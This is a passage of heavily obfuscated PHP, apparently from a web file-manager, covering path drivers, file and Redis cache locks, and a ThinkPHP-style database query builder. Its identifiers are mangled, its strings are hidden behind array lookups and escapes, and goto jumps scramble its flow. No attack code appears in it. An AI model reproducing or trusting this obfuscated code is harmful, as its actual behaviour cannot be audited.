$_SERVER[ç¦¬”œš]; $¦°À­ö = $this->listAll($·‘©«Àµ); $•¢åëî• = $this->pathParse[$—€¤¯’[504]]; if (trim($•¢åëî•, $—€¤¯’[8]) == trim(get_path_father($•¢åëî•), $—€¤¯’[8])) { $ëåöÇöı = !0; } return IO::init($—€¤¯’[12])->listAllSimpleMake($¦°À­ö, $•¢åëî•, $ëåöÇöı); } public function getPathOuter($–¤—Ÿ†Ú) { $”ìÜ =& $_SERVER[ç¦¬”œš]; $â¦ ¢Ò = KodIO::parse($–¤—Ÿ†Ú); if ($â¦ ¢Ò[$”ìÜ[33]] == KodIO::KOD_SHARE_ITEM) { return $â¦ ¢Ò[$”ìÜ[87]]; } $ Æô¾Ò· = KodIO::clear($–¤—Ÿ†Ú); $îõşŞØş = KodIO::clear($this->pathParse[$”ìÜ[569]][$”ìÜ[1258]]); $›È‘‚¦ß = substr($ Æô¾Ò·, strlen($îõşŞØş)); if (substr($ Æô¾Ò·, 0, strlen($îõşŞØş)) != $îõşŞØş) { return !1; } return $this->pathParse[$”ìÜ[1252]] . $”ìÜ[8] . ltrim($›È‘‚¦ß, $”ìÜ[8]); } public function getType() { $¤œ†¶ =& $_SERVER[ç¦¬”œš]; $¥ÄºÂŸğ = str_replace($¤œ†¶[77], $¤œ†¶[12], get_class($this)); return strtolower($¥ÄºÂŸğ); } public function isOsDriver($ëÑ¹Â§Î) { return IO::isOsDriver($ëÑ¹Â§Î); } public function info($Ù² ƒå«) { return $this->infoParse($Ù² ƒå«); } public function infoAuth($ŸÔœÎ‹‚) { return $this->infoParse($ŸÔœÎ‹‚); } public function infoWithChildren($˜ÖÌ—Ê˜) { return $this->infoParse($˜ÖÌ—Ê˜, !0); } public function infoFull($Ñ¢›‹ºé) { return $this->infoParse($Ñ¢›‹ºé); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($á±Õæª) { $this->pathParse = $á±Õæª; } protected function infoParse($Ú¸ÜŞÚî, $Ÿ½œøÕÄ = false) { $™é¤ îí =& $_SERVER[ç¦¬”œš]; return Action($™é¤ îí[1257])->sharePathInfo($this->pathParse[$™é¤ îí[87]], !0, $Ÿ½œøÕÄ); } public function listPath($Âíòõæ, $ëˆ‘åç = false) { $Ä§Îµ™É =& $_SERVER[ç¦¬”œš]; $ ú«¤Ë¯ = IO::listPath($Âíòõæ, $ëˆ‘åç); if (!$ ú«¤Ë¯) { return $ ú«¤Ë¯; } if (is_array($ ú«¤Ë¯[$Ä§Îµ™É[1427]])) { $ıÒ´ùÕ‹ = Action($Ä§Îµ™É[1436])->parsePathChildren($ ú«¤Ë¯[$Ä§Îµ™É[1427]], array($Ä§Îµ™É[504] => $Âíòõæ)); $ ú«¤Ë¯[$Ä§Îµ™É[1427]] = Action($Ä§Îµ™É[1257])->shareItemInfo($ıÒ´ùÕ‹); } foreach ($ ú«¤Ë¯ as $Üæå—áø => $¯Ë¡ƒ€) { if (!in_array($Üæå—áø, array($Ä§Îµ™É[86], $Ä§Îµ™É[85]))) { continue; } foreach ($¯Ë¡ƒ€ as $­Í–Ö´ => $ıÒ´ùÕ‹) { $ıÒ´ùÕ‹ = Action($Ä§Îµ™É[1436])->parsePathChildren($ıÒ´ùÕ‹, array($Ä§Îµ™É[504] => $Âíòõæ)); $ ú«¤Ë¯[$Üæå—áø][$­Í–Ö´] = Action($Ä§Îµ™É[1257])->shareItemInfo($ıÒ´ùÕ‹); } } return $ ú«¤Ë¯; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($²Ö¼ƒô«) { parent::__construct($²Ö¼ƒô«); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } } goto b©Ÿã™‚î; D‰Ò‹å¢ÅŸ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $àûãŒ Œ =& $_SERVER[ç¦¬”œš]; $Í¦ş¬¤æ = $GLOBALS[$àûãŒ Œ[6]][$àûãŒ Œ[425]]; self::$cachePath = $Í¦ş¬¤æ[$àûãŒ Œ[230]][$àûãŒ Œ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($£îÄ·Ö˜, $†Õ„±ÖÓ = 0) { $ôµ²Œ„ä =& $_SERVER[ç¦¬”œš]; $¿äëûÔ§ = microtime(!0); $ÍÊë®’À = $¿äëûÔ§ + $†Õ„±ÖÓ + 0.0001; $‡ëóÆš„ = rtrim(self::$cachePath, $ôµ²Œ„ä[8]) . $ôµ²Œ„ä[943] . md5($£îÄ·Ö˜) . $ôµ²Œ„ä[940]; if (file_exists($‡ëóÆš„) && filemtime($‡ëóÆš„) && filemtime($‡ëóÆš„) < time() - 10) { @unlink($‡ëóÆš„); } do { if (file_exists($‡ëóÆš„)) { cacheLockWait(); continue; } $İßè®Ú¦ = fopen($‡ëóÆš„, $ôµ²Œ„ä[944]); if (!$İßè®Ú¦) { return !1; } $Õ…ÃİÄª = flock($İßè®Ú¦, LOCK_EX | LOCK_NB); self::$caches[$£îÄ·Ö˜] = array($ôµ²Œ„ä[945] => $İßè®Ú¦, $ôµ²Œ„ä[230] => $‡ëóÆš„); fwrite($İßè®Ú¦, $ÍÊë®’À); clearstatcache(); if ($İßè®Ú¦ && $Õ…ÃİÄª) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÍÊë®’À); $this->unlock($£îÄ·Ö˜); return !1; } public function lockGet($Õêóƒğù) { $ÔÄ€¿õ =& $_SERVER[ç¦¬”œš]; $è÷Â­£¼ = rtrim(self::$cachePath, $ÔÄ€¿õ[8]) . $ÔÄ€¿õ[943] . md5($Õêóƒğù) . $ÔÄ€¿õ[940]; return file_exists($è÷Â­£¼); } public function unlock($Üçû•ë) { $®Œ­ä¾Ÿ =& $_SERVER[ç¦¬”œš]; $Øœ‹÷‡â = self::$caches[$Üçû•ë]; if (!$Øœ‹÷‡â) { return; } @flock($Øœ‹÷‡â[$®Œ­ä¾Ÿ[945]], LOCK_UN); @fclose($Øœ‹÷‡â[$®Œ­ä¾Ÿ[945]]); @unlink($Øœ‹÷‡â[$®Œ­ä¾Ÿ[230]]); unset(self::$caches[$Üçû•ë]); } } class CacheLockRedis { public function lock($ÚûË¶ï, $¸Ÿà‹ó¾ = 10) { $Š»ğü ² = Cache::init(); $‡š£Çµ = microtime(!0) + $¸Ÿà‹ó¾; while (microtime(!0) < $‡š£Çµ) { $åš·ÏÎÀ = $Š»ğü ²->get($ÚûË¶ï); if (!$åš·ÏÎÀ) { $Ì·øøïÖ = $Š»ğü ²->setLock($ÚûË¶ï, $‡š£Çµ, $¸Ÿà‹ó¾); if ($Ì·øøïÖ) { return !0; } } else { if ($åš·ÏÎÀ < microtime(!0)) { $Š»ğü ²->set($ÚûË¶ï, $‡š£Çµ, $¸Ÿà‹ó¾ * 2); if ($Š»ğü ²->get($ÚûË¶ï) === $åš·ÏÎÀ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($òº„·İ“) { return Cache::init()->get($òº„·İ“); } public function unlock($áê ñç) { return Cache::init()->remove($áê ñç); } } goto AƒÁÇŞ¦Çâ; e×ôØ®£Ç: class DbSqlite3 extends DbSqlite3Base { public function query($ûâğ¼´) { $‹×«÷ø =& $_SERVER[ç¦¬”œš]; if (!CacheLock::fileLock($‹×«÷ø[13])) { return !1; } $ö«ş‡«ü = parent::query($ûâğ¼´); CacheLock::fileUnLock($‹×«÷ø[13]); return $ö«ş‡«ü; } public function execute($¨Šè†ÉÆ) { $ÓëÁãİŒ =& $_SERVER[ç¦¬”œš]; if (!CacheLock::fileLock($ÓëÁãİŒ[13])) { return !1; } $Ğ³ª§æ† = parent::execute($¨Šè†ÉÆ); CacheLock::fileUnLock($ÓëÁãİŒ[13]); return $Ğ³ª§æ†; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\145\x71" => "\x3c\x3e", "\147\164" => "\76", "\145\x67\x74" => "\x3e\75", "\x6c\x74" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\x6f\x74\154\151\153\145" => "\116\x4f\124\x20\114\x49\113\105", "\x6c\x69\153\145" => "\x4c\111\113\x45", "\151\156" => "\x49\x4e", "\156\x6f\164\x69\x6e" => "\x4e\117\124\x20\x49\116", "\x6e\x6f\x74\40\x69\156" => "\116\x4f\124\40\x49\116", "\142\x65\x74\x77\145\x65\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\156\x6f\164\x62\145\x74\x77\x65\x65\x6e" => "\116\x4f\124\40\102\x45\x54\127\105\105\x4e", "\156\x6f\164\x20\x62\x65\x74\x77\145\145\156" => "\x4e\x4f\x54\40\x42\105\x54\127\x45\105\116"); protected $selectSql = "\x53\105\x4c\x45\x43\124\x25\x44\x49\x53\124\x49\116\x43\124\x25\40\x25\106\x49\105\x4c\104\x25\x20\106\x52\x4f\115\x20\45\x54\101\x42\114\105\x25\45\112\x4f\111\x4e\45\x25\127\110\105\122\x45\x25\x25\x47\122\117\x55\x50\x25\45\110\x41\126\x49\116\107\x25\45\x4f\x52\x44\105\122\x25\x25\114\111\115\x49\x54\x25\x20\x25\x55\x4e\x49\x4f\x4e\45\x25\x43\x4f\115\115\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $ÊÚó¦£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ç¦¬”œš][1039], $ÊÚó¦£); } public function factory($…’Œ°°Ÿ = '') { $—«šÉá¢ =& $_SERVER[ç¦¬”œš]; $…’Œ°°Ÿ = $this->parseConfig($…’Œ°°Ÿ); if (empty($…’Œ°°Ÿ[$—«šÉá¢[1040]])) { think_exception(think_lang($—«šÉá¢[1041])); } $this->dbType = ucwords(strtolower($…’Œ°°Ÿ[$—«šÉá¢[1040]])); $¯€äê¿ˆ = $—«šÉá¢[1042] . $this->dbType; if (class_exists($¯€äê¿ˆ)) { $ğ”©›ø = new $¯€äê¿ˆ($…’Œ°°Ÿ); if ($—«šÉá¢[1043] != strtolower($…’Œ°°Ÿ[$—«šÉá¢[1040]])) { $ğ”©›ø->dbType = strtoupper($this->dbType); } else { $ğ”©›ø->dbType = $this->_getDsnType($…’Œ°°Ÿ[$—«šÉá¢[995]]); } } else { think_exception(think_lang($—«šÉá¢[1044]) . $—«šÉá¢[1045] . $¯€äê¿ˆ); } return $ğ”©›ø; } public function __call($Áƒæ›õ, $”©šĞ€±) { if (method_exists($this, $Áƒæ›õ)) { return call_user_func_array(array($this, $Áƒæ›õ), $”©šĞ€±); } } protected function _getDsnType($†£üôÔ¤) { $…ŸÌª¶ñ = explode($_SERVER[ç¦¬”œš][4], $†£üôÔ¤); $ŸòÀ¡ = strtoupper(trim($…ŸÌª¶ñ[0])); return $ŸòÀ¡; } private function parseConfig($É‚‰á©¢ = '') { $ë‚Ó‚°¿ =& $_SERVER[ç¦¬”œš]; if (!empty($É‚‰á©¢) && is_string($É‚‰á©¢)) { $É‚‰á©¢ = $this->parseDSN($É‚‰á©¢); } elseif (is_array($É‚‰á©¢)) { $É‚‰á©¢ = array_change_key_case($É‚‰á©¢); $É‚‰á©¢ = array($ë‚Ó‚°¿[1040] => $É‚‰á©¢[$ë‚Ó‚°¿[1046]], $ë‚Ó‚°¿[967] => $É‚‰á©¢[$ë‚Ó‚°¿[1047]], $ë‚Ó‚°¿[968] => $É‚‰á©¢[$ë‚Ó‚°¿[1048]], $ë‚Ó‚°¿[965] => $É‚‰á©¢[$ë‚Ó‚°¿[1049]], $ë‚Ó‚°¿[966] => $É‚‰á©¢[$ë‚Ó‚°¿[1050]], $ë‚Ó‚°¿[21] => $É‚‰á©¢[$ë‚Ó‚°¿[1051]], $ë‚Ó‚°¿[995] => $É‚‰á©¢[$ë‚Ó‚°¿[1052]], $ë‚Ó‚°¿[17] => isset($É‚‰á©¢[$ë‚Ó‚°¿[1053]]) ? $É‚‰á©¢[$ë‚Ó‚°¿[1053]] : array()); } elseif (empty($É‚‰á©¢)) { if (think_config($ë‚Ó‚°¿[1054]) && $ë‚Ó‚°¿[1043] != strtolower(think_config($ë‚Ó‚°¿[1055]))) { $É‚‰á©¢ = $this->parseDSN(think_config($ë‚Ó‚°¿[1054])); } else { $É‚‰á©¢ = array($ë‚Ó‚°¿[1040] => think_config($ë‚Ó‚°¿[1055]), $ë‚Ó‚°¿[967] => think_config($ë‚Ó‚°¿[1056]), $ë‚Ó‚°¿[968] => think_config($ë‚Ó‚°¿[1057]), $ë‚Ó‚°¿[965] => think_config($ë‚Ó‚°¿[1058]), $ë‚Ó‚°¿[966] => think_config($ë‚Ó‚°¿[1059]), $ë‚Ó‚°¿[21] => think_config($ë‚Ó‚°¿[323]), $ë‚Ó‚°¿[995] => think_config($ë‚Ó‚°¿[1054]), $ë‚Ó‚°¿[17] => think_config($ë‚Ó‚°¿[1060])); } } return $É‚‰á©¢; } protected function initConnect($Ÿ“¯ÈÇ = true) { if (1 == think_config($_SERVER[ç¦¬”œš][22])) { $this->_linkID = $this->multiConnect($Ÿ“¯ÈÇ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Œø³§ß => $ú·ïÜ²ñ) { $this->_linkID = $ú·ïÜ²ñ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($º“¥ÏˆÁ = false) { $İ¶âè =& $_SERVER[ç¦¬”œš]; static $ÅÈÒñ¬Ü = array(); static $İ’¹Ãéø = -1; if (empty($ÅÈÒñ¬Ü)) { foreach ($this->config as $¦ÔÖóĞ» => $Ç”ø½ˆ) { $ÅÈÒñ¬Ü[$¦ÔÖóĞ»] = explode($İ¶âè[50], $Ç”ø½ˆ); } } if (think_config($İ¶âè[1061])) { if ($º“¥ÏˆÁ || think_config($İ¶âè[471]) === !0) { $ƒºşŒõ  = floor(mt_rand(0, think_config($İ¶âè[1062]) - 1)); $İ’¹Ãéø = $ƒºşŒõ ; } else { if (is_numeric(think_config($İ¶âè[1063]))) { $ƒºşŒõ  = think_config($İ¶âè[1063]); } else { $ƒºşŒõ  = floor(mt_rand(think_config($İ¶âè[1062]), count($ÅÈÒñ¬Ü[$İ¶âè[965]]) - 1)); } } } else { $ƒºşŒõ  = floor(mt_rand(0, count($ÅÈÒñ¬Ü[$İ¶âè[965]]) - 1)); $İ’¹Ãéø = $ƒºşŒõ ; } $ƒºşŒõ  = $İ’¹Ãéø !== -1 ? $İ’¹Ãéø : $ƒºşŒõ ; $óÊÄÒ¨® = array($İ¶âè[967] => isset($ÅÈÒñ¬Ü[$İ¶âè[967]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[967]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[967]][0], $İ¶âè[968] => isset($ÅÈÒñ¬Ü[$İ¶âè[968]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[968]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[968]][0], $İ¶âè[965] => isset($ÅÈÒñ¬Ü[$İ¶âè[965]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[965]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[965]][0], $İ¶âè[966] => isset($ÅÈÒñ¬Ü[$İ¶âè[966]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[966]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[966]][0], $İ¶âè[21] => isset($ÅÈÒñ¬Ü[$İ¶âè[21]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[21]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[21]][0], $İ¶âè[995] => isset($ÅÈÒñ¬Ü[$İ¶âè[995]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[995]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[995]][0], $İ¶âè[17] => isset($ÅÈÒñ¬Ü[$İ¶âè[17]][$ƒºşŒõ ]) ? $ÅÈÒñ¬Ü[$İ¶âè[17]][$ƒºşŒõ ] : $ÅÈÒñ¬Ü[$İ¶âè[17]][0]); return $this->connect($óÊÄÒ¨®, $ƒºşŒõ ); } public function parseDSN($‚†İ²®¹) { $úÒÍÀ¯è =& $_SERVER[ç¦¬”œš]; if (empty($‚†İ²®¹)) { return !1; } $Ó’ı¾“Á = parse_url($‚†İ²®¹); if ($Ó’ı¾“Á[$úÒÍÀ¯è[207]]) { $Òé»¯ÊÅ = array($úÒÍÀ¯è[1040] => $Ó’ı¾“Á[$úÒÍÀ¯è[207]], $úÒÍÀ¯è[967] => isset($Ó’ı¾“Á[$úÒÍÀ¯è[671]]) ? $Ó’ı¾“Á[$úÒÍÀ¯è[671]] : $úÒÍÀ¯è[12], $úÒÍÀ¯è[968] => isset($Ó’ı¾“Á[$úÒÍÀ¯è[1064]]) ? $Ó’ı¾“Á[$úÒÍÀ¯è[1064]] : $úÒÍÀ¯è[12], $úÒÍÀ¯è[965] => isset($Ó’ı¾“Á[$úÒÍÀ¯è[208]]) ? $Ó’ı¾“Á[$úÒÍÀ¯è[208]] : $úÒÍÀ¯è[12], $úÒÍÀ¯è[966] => isset($Ó’ı¾“Á[$úÒÍÀ¯è[209]]) ? $Ó’ı¾“Á[$úÒÍÀ¯è[209]] : $úÒÍÀ¯è[12], $úÒÍÀ¯è[21] => isset($Ó’ı¾“Á[$úÒÍÀ¯è[87]]) ? substr($Ó’ı¾“Á[$úÒÍÀ¯è[87]], 1) : $úÒÍÀ¯è[12]); } else { preg_match($úÒÍÀ¯è[1065], trim($‚†İ²®¹), $ÏÎô¥ò); $Òé»¯ÊÅ = array($úÒÍÀ¯è[1040] => $ÏÎô¥ò[1], $úÒÍÀ¯è[967] => $ÏÎô¥ò[2], $úÒÍÀ¯è[968] => $ÏÎô¥ò[3], $úÒÍÀ¯è[965] => $ÏÎô¥ò[4], $úÒÍÀ¯è[966] => $ÏÎô¥ò[5], $úÒÍÀ¯è[21] => $ÏÎô¥ò[6]); } $Òé»¯ÊÅ[$úÒÍÀ¯è[995]] = $úÒÍÀ¯è[12]; return $Òé»¯ÊÅ; } protected function debug() { $ªÚÛÜ‚« =& $_SERVER[ç¦¬”œš]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ªÚÛÜ‚«[1066]; if (think_config($ªÚÛÜ‚«[1067])) { think_status($ªÚÛÜ‚«[1068]); think_trace($this->queryStr . $ªÚÛÜ‚«[1069] . think_status($ªÚÛÜ‚«[24], $ªÚÛÜ‚«[1068], 6) . $ªÚÛÜ‚«[1070], $ªÚÛÜ‚«[12], $ªÚÛÜ‚«[1071]); } } protected function parseLock($úÑûÇ¯„ = false) { $Ñ§¨ÁÉò =& $_SERVER[ç¦¬”œš]; if (!$úÑûÇ¯„) { return $Ñ§¨ÁÉò[12]; } if ($Ñ§¨ÁÉò[997] == $this->dbType) { return $Ñ§¨ÁÉò[1072]; } return $Ñ§¨ÁÉò[1073]; } protected function parseSet($®œŸ×Ñ) { $™”×†Òß =& $_SERVER[ç¦¬”œš]; foreach ($®œŸ×Ñ as $¢¿›™ø => $¦«ùß‚À) { if (is_array($¦«ùß‚À) && $™”×†Òß[373] == $¦«ùß‚À[0]) { $æ¹­Ù«[] = $this->parseKey($¢¿›™ø) . $™”×†Òß[963] . $¦«ùß‚À[1]; } elseif (is_scalar($¦«ùß‚À) || is_null($¦«ùß‚À)) { $æ¹­Ù«[] = $this->parseKey($¢¿›™ø) . $™”×†Òß[963] . $this->parseValue($¦«ùß‚À); } } return $™”×†Òß[1074] . implode($™”×†Òß[50], $æ¹­Ù«); } protected function bindParam($šâïµ‡ò, $§¾úĞß) { $this->bind[$_SERVER[ç¦¬”œš][4] . $šâïµ‡ò] = $§¾úĞß; } protected function parseBind($Úê½¤Æ‚) { $Úê½¤Æ‚ = array_merge($this->bind, $Úê½¤Æ‚); $this->bind = array(); return $Úê½¤Æ‚; } function parseKey(&$¥‹ãÅÆ, $ĞŞ†š”Ÿ = true) { if ($ĞŞ†š”Ÿ) { $¥‹ãÅÆ = $this->parseKeyCheck($¥‹ãÅÆ); } return $¥‹ãÅÆ; } function parseKeyCheck($Ú´¶÷µë) { $ø˜àÖ…À =& $_SERVER[ç¦¬”œš]; $Ú´¶÷µë = trim($Ú´¶÷µë); if (!preg_match($ø˜àÖ…À[1075], $Ú´¶÷µë)) { think_exception($ø˜àÖ…À[1076] . $Ú´¶÷µë); } return $Ú´¶÷µë; } protected function parseValue($“¸ÍÌÅÄ) { $êÊ­šÈ =& $_SERVER[ç¦¬”œš]; if (is_string($“¸ÍÌÅÄ)) { $“¸ÍÌÅÄ = $êÊ­šÈ[1036] . $this->escapeString($“¸ÍÌÅÄ) . $êÊ­šÈ[1036]; } elseif (isset($“¸ÍÌÅÄ[0]) && is_string($“¸ÍÌÅÄ[0]) && strtolower($“¸ÍÌÅÄ[0]) == $êÊ­šÈ[373]) { $“¸ÍÌÅÄ = $this->escapeString($“¸ÍÌÅÄ[1]); } elseif (is_array($“¸ÍÌÅÄ)) { $“¸ÍÌÅÄ = array_map(array($this, $êÊ­šÈ[1037]), $“¸ÍÌÅÄ); } elseif (is_bool($“¸ÍÌÅÄ)) { $“¸ÍÌÅÄ = $“¸ÍÌÅÄ ? $êÊ­šÈ[91] : $êÊ­šÈ[228]; } elseif (is_null($“¸ÍÌÅÄ)) { $“¸ÍÌÅÄ = $êÊ­šÈ[106]; } return $“¸ÍÌÅÄ; } protected function parseField($úÓ“„¦) { $†¨ÈïĞé =& $_SERVER[ç¦¬”œš]; if (is_string($úÓ“„¦) && strpos($úÓ“„¦, $†¨ÈïĞé[50])) { $úÓ“„¦ = explode($†¨ÈïĞé[50], $úÓ“„¦); } if (is_array($úÓ“„¦)) { $ÓŒãºë¹ = array(); foreach ($úÓ“„¦ as $ìó®¨Àä => $øó¿‚Á) { if (!is_numeric($ìó®¨Àä)) { $ÓŒãºë¹[] = $this->parseKey($ìó®¨Àä, !1) . $†¨ÈïĞé[1077] . $this->parseKey($øó¿‚Á); } else { $ÓŒãºë¹[] = $this->parseKey($øó¿‚Á); } } $ŞÔŞàú‘ = implode($†¨ÈïĞé[50], $ÓŒãºë¹); } elseif (is_string($úÓ“„¦) && !empty($úÓ“„¦)) { $ŞÔŞàú‘ = $úÓ“„¦; } else { $ŞÔŞàú‘ = $†¨ÈïĞé[220]; } return $ŞÔŞàú‘; } protected function parseTable($ªí·×¸) { $¬é®ä­ =& $_SERVER[ç¦¬”œš]; if (is_array($ªí·×¸)) { $´¸ÖÓ‹ = array(); foreach ($ªí·×¸ as $ï¸¬Úà¾ => $îÓş“‡ï) { if (!is_numeric($ï¸¬Úà¾)) { $´¸ÖÓ‹[] = $this->parseKey($ï¸¬Úà¾) . $¬é®ä­[53] . $this->parseKey($îÓş“‡ï); } else { $´¸ÖÓ‹[] = $this->parseKey($ï¸¬Úà¾); } } $ªí·×¸ = $´¸ÖÓ‹; } elseif (is_string($ªí·×¸)) { if (strstr($ªí·×¸, $¬é®ä­[53])) { return $ªí·×¸; } $ªí·×¸ = explode($¬é®ä­[50], $ªí·×¸); array_walk($ªí·×¸, array($this, $¬é®ä­[985])); } return $¬é®ä­[979] . trim(implode($¬é®ä­[1078], $ªí·×¸), $¬é®ä­[461]) . $¬é®ä­[979]; } protected function parseWhere($–ÇöÛ›—) { $©–¬´Õ˜ =& $_SERVER[ç¦¬”œš]; $¸óç´Ú© = $©–¬´Õ˜[12]; if (is_string($–ÇöÛ›—)) { $¸óç´Ú© = $–ÇöÛ›—; } else { $âèÑÅ–Ä = isset($–ÇöÛ›—[$©–¬´Õ˜[1079]]) ? strtoupper($–ÇöÛ›—[$©–¬´Õ˜[1079]]) : $©–¬´Õ˜[12]; if (in_array($âèÑÅ–Ä, array($©–¬´Õ˜[1080], $©–¬´Õ˜[1081], $©–¬´Õ˜[1082]))) { $âèÑÅ–Ä = $©–¬´Õ˜[53] . $âèÑÅ–Ä . $©–¬´Õ˜[53]; unset($–ÇöÛ›—[$©–¬´Õ˜[1079]]); } else { $âèÑÅ–Ä = $©–¬´Õ˜[1083]; } foreach ($–ÇöÛ›— as $Éûœğ¿Ã => $Ö‚£©‡) { $¸óç´Ú© .= $©–¬´Õ˜[354]; if (is_numeric($Éûœğ¿Ã)) { $Éûœğ¿Ã = $©–¬´Õ˜[1084]; } if (0 === strpos($Éûœğ¿Ã, $©–¬´Õ˜[11])) { $¸óç´Ú© .= $this->parseThinkWhere($Éûœğ¿Ã, $Ö‚£©‡); } else { if (!preg_match($©–¬´Õ˜[1085], trim($Éûœğ¿Ã))) { think_exception(think_lang($©–¬´Õ˜[1086]) . $©–¬´Õ˜[4] . $Éûœğ¿Ã); } $©æ¹ºÑ÷ = is_array($Ö‚£©‡) && isset($Ö‚£©‡[$©–¬´Õ˜[1087]]); $Éûœğ¿Ã = trim($Éûœğ¿Ã); if (strpos($Éûœğ¿Ã, $©–¬´Õ˜[214])) { $Ú—­ÉŞı = explode($©–¬´Õ˜[214], $Éûœğ¿Ã); $Ä“Ñş = array(); foreach ($Ú—­ÉŞı as $—¡Ì¡îÂ => $àÖôö¤) { $–¥Ææ­Á = $©æ¹ºÑ÷ ? $Ö‚£©‡[$—¡Ì¡îÂ] : $Ö‚£©‡; $Ä“Ñş[] = $©–¬´Õ˜[337] . $this->parseWhereItem($this->parseKey($àÖôö¤), $–¥Ææ­Á) . $©–¬´Õ˜[984]; } $¸óç´Ú© .= implode($©–¬´Õ˜[1088], $Ä“Ñş); } elseif (strpos($Éûœğ¿Ã, $©–¬´Õ˜[360])) { $Ú—­ÉŞı = explode($©–¬´Õ˜[360], $Éûœğ¿Ã); $Ä“Ñş = array(); foreach ($Ú—­ÉŞı as $—¡Ì¡îÂ => $àÖôö¤) { $–¥Ææ­Á = $©æ¹ºÑ÷ ? $Ö‚£©‡[$—¡Ì¡îÂ] : $Ö‚£©‡; $Ä“Ñş[] = $©–¬´Õ˜[337] . $this->parseWhereItem($this->parseKey($àÖôö¤), $–¥Ææ­Á) . $©–¬´Õ˜[984]; } $¸óç´Ú© .= implode($©–¬´Õ˜[1083], $Ä“Ñş); } else { $¸óç´Ú© .= $this->parseWhereItem($this->parseKey($Éûœğ¿Ã), $Ö‚£©‡); } } $¸óç´Ú© .= $©–¬´Õ˜[355] . $âèÑÅ–Ä; } $¸óç´Ú© = substr($¸óç´Ú©, 0, -strlen($âèÑÅ–Ä)); } return empty($¸óç´Ú©) ? $©–¬´Õ˜[12] : $©–¬´Õ˜[1089] . $¸óç´Ú©; } protected function parseWhereItem($—Ğå‰²×, $°¾Ãßƒ™) { $·éœ©î… =& $_SERVER[ç¦¬”œš]; $¯¶ƒ¼Ò‘ = $·éœ©î…[12]; if (is_array($°¾Ãßƒ™)) { if (is_string($°¾Ãßƒ™[0])) { $óüâüöµ = strtolower($°¾Ãßƒ™[0]); if (in_array($°¾Ãßƒ™[0], array($·éœ©î…[963], $·éœ©î…[1090], $·éœ©î…[1091], $·éœ©î…[1092], $·éœ©î…[1093], $·éœ©î…[1094]))) { $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[53] . $°¾Ãßƒ™[0] . $·éœ©î…[53] . $this->parseValue($°¾Ãßƒ™[1]); } elseif (preg_match($·éœ©î…[1095], $°¾Ãßƒ™[0])) { $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[53] . $this->exp[$óüâüöµ] . $·éœ©î…[53] . $this->parseValue($°¾Ãßƒ™[1]); } elseif (preg_match($·éœ©î…[1096], $°¾Ãßƒ™[0])) { if (is_array($°¾Ãßƒ™[1])) { $…í¨ŒÇğ = isset($°¾Ãßƒ™[2]) ? strtoupper($°¾Ãßƒ™[2]) : $·éœ©î…[1081]; if (in_array($…í¨ŒÇğ, array($·éœ©î…[1080], $·éœ©î…[1081], $·éœ©î…[1082]))) { $—Î“ õê = array(); foreach ($°¾Ãßƒ™[1] as $ßæÂµ´Á) { $—Î“ õê[] = $—Ğå‰²× . $·éœ©î…[53] . $this->exp[$óüâüöµ] . $·éœ©î…[53] . $this->parseValue($ßæÂµ´Á); } $¯¶ƒ¼Ò‘ .= $·éœ©î…[337] . implode($·éœ©î…[53] . $…í¨ŒÇğ . $·éœ©î…[53], $—Î“ õê) . $·éœ©î…[984]; } } else { $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[53] . $this->exp[$óüâüöµ] . $·éœ©î…[53] . $this->parseValue($°¾Ãßƒ™[1]); } } elseif ($·éœ©î…[373] == $óüâüöµ) { $¯¶ƒ¼Ò‘ .= $·éœ©î…[982] . $—Ğå‰²× . $·éœ©î…[53] . $°¾Ãßƒ™[1] . $·éœ©î…[1097]; } elseif (preg_match($·éœ©î…[1098], $°¾Ãßƒ™[0])) { $¯¶ƒ¼Ò‘ .= $°¾Ãßƒ™[0]; } elseif (preg_match($·éœ©î…[1099], $°¾Ãßƒ™[0])) { if (isset($°¾Ãßƒ™[2]) && $·éœ©î…[373] == $°¾Ãßƒ™[2]) { $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[53] . 